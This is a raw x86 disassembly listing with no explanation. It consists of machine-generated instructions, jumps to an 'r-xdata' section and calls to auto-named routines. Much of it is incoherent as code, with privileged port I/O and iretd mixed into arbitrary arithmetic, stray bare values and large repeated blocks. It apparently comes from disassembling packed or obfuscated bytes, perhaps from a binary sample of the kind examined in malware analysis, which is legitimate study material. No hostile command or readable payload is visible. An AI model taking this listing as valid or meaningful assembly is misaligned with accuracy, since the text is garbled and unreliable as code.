inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff84289cc4
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
jo 0xffffffffa2c13366
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
jae r-xdata
je 0xffffffffff6da896
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024cb
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d6
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_40216e
pop ecx
pop edx
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
add edx 0xff108f0f
pop edx
mov eax 0xff55870f
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1df82
ja r-xdata
call 0xffc9a91
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a45e58
jg r-xdata
and ebx 0xff5a870f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop edx
pop edx
jae r-xdata
jne r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jae r-xdata
ja r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
pushfd
push esi
call sub_4021f2
sub ebx 0xa48f0f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
ja r-xdata
jge 0x71fc60fa
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a0bc
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a8f3
add [ eax ] al
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jno r-xdata
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_40230c
add esi 0xa6830f
add [ eax ] al
mov ebx 0xf04c483
jae r-xdata
ja 0xffffffffa3c331b7
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
pop eax
ja r-xdata
xor edx 0x880f5e7f
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
push ecx
push edx
push ebp
sub esp 0x4
call sub_4021be
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jne r-xdata
sub edi 0x64244481
cwde
sub [ eax ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21f
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
push ebp
pushfd
call sub_4021fb
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jne r-xdata
or edx 0xf3812e79
jg r-xdata
jpo 0xdea79d
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
pop eax
jge r-xdata
jge 0xffffffffffa2a4a7
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15fe1
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_40258c
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jg r-xdata
ja 0xffffffffff9ba474
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d7
lea eax [ ecx + 0x1 ]
add [ eax ] al
pop ecx
jns r-xdata
jno 0xffffffff874f575a
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c15
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40221e
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jno r-xdata
and ebx 0x870f4975
jae r-xdata
call sub_402383
jb 0xffffffff81b2a039
or edx 0x54549c55
ja r-xdata
xor ebx 0xff3d870f
call sub_40216e
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7d1
jg r-xdata
ja 0xcaa5cd
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44ea00
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
jmp 0xffffffffff79a2b5
pop edx
jge r-xdata
jo 0xffffffff854f7cc6
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e78c
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcf4cb
add esp 0x4
jae r-xdata
jl 0xf3a54f
jg r-xdata
add eax 0x5abb2979
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e7
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a80a
pop eax
jg r-xdata
jge 0xffffffff894f7c48
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd340e
ja r-xdata
jno 0xffffffffe89176e5
push 0x81ffffff
out 0x77 al
jne r-xdata
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402229
jae 0xffffffffff43aa4e
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jno r-xdata
jae 0xffffffff84289cc4
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a7a9
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
je 0xffffffffff6da896
jge r-xdata
les ecx [ eax ]
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
jo 0xffffffffa2c13366
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024cb
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d6
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4021be
ja r-xdata
jno r-xdata
jl 0x2f28be1f
jno r-xdata
jl 0xfffffffff6c1df82
add [ eax ] al
add [ edx + 0x7504c483 ] bh
pop edx
pop edx
jns 0xffffffff814ffe2d
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jne r-xdata
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a8f3
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jg r-xdata
xor ecx 0xff70810f
jae r-xdata
ja 0xffffffff89a45e58
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffc9a91
cmp [ edi + 0x7f ] 0x81

ja r-xdata
or ebx 0xff6e8f0f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
ja r-xdata
xor ebx 0xff3d870f
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jne r-xdata
sub edi 0x64244481
cwde
sub [ eax ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21f
jae r-xdata
ja 0xffffffffa3c331b7
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
jmp 0xffffffffff79a2b5
ja r-xdata
jge 0x71fc60fa
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a0bc
jg r-xdata
jpo 0xdea79d
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
add eax 0x5abb2979
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_40258c
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15fe1
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c15
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40221e
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_4021f2
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_40230c
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
call [ 0xffffffffc181727f ]
push ecx
push edx
push ebp
sub esp 0x4
call sub_4021be
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7d1
jg r-xdata
ja 0xcaa5cd
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44ea00
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d7
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9ba474
jae r-xdata
add edx 0xff108f0f
call sub_40216e
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
rol [ ecx + 0x108f0fc2 ] 0xff
push ebp
pushfd
call sub_4021fb
mov edx 0x7504c483
mov esp 0xe2818371
jne r-xdata
or edx 0xf3812e79
pop edx
jge r-xdata
jo 0xffffffff854f7cc6
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e78c
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcf4cb
jae r-xdata
call sub_402383
jb 0xffffffff81b2a039
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
pop eax
jge r-xdata
jge 0xffffffffffa2a4a7
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e7
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a80a
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
pop ecx
jns r-xdata
jno 0xffffffff874f575a
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd340e
add esp 0x4
jae r-xdata
jl 0xf3a54f
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402229
jae 0xffffffffff43aa4e
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7c48
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89176e5
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a7a9
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff84289cc4
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
jo 0xffffffffa2c13366
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
jae r-xdata
je 0xffffffffff6da896
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024cb
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d6
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4021f2
pop ecx
ja r-xdata
pop edx
ja r-xdata
jae 0xffffffff81ce9757
pop eax
jns r-xdata
jno 0xffffffffefc15fe1
out dx eax
jae r-xdata
jne 0xffffffffe3c203f0
push ecx
push edx
push ebp
sub esp 0x4
call sub_4021be
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jg r-xdata
sub edi 0x5c755a59
ja r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jno r-xdata
jno 0xfffffffff1c1ab27
ja r-xdata
jge 0x71fc60fa
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
ja r-xdata
and edx 0xff42850f
jno r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a8f3
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1df82
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
jmp [ 0xfffffffff381df77 ]
jno r-xdata
sub esi 0x89641f79
push ebp
pushfd
call sub_4021fb
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffc9a91
cmp [ edi + 0x7f ] 0x81

jae r-xdata
ja 0xffffffff89a45e58
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
jge r-xdata
jge 0xffffffffffa2a4a7
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jg r-xdata
pop edx
pop edx
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a0bc
pop ecx
jns r-xdata
jno 0xffffffff874f575a
pushfd
push esi
call sub_4021f2
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_40230c
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
cwde
sub [ eax ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21f
jae r-xdata
ja 0xffffffffa3c331b7
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdea79d
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_40258c
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c15
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40221e
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7d1
jg r-xdata
ja 0xcaa5cd
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44ea00
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d7
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9ba474
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
pop edx
jge r-xdata
jo 0xffffffff854f7cc6
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e78c
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcf4cb
jae r-xdata
call sub_402383
jb 0xffffffff81b2a039
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e7
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a80a
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_40216e
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
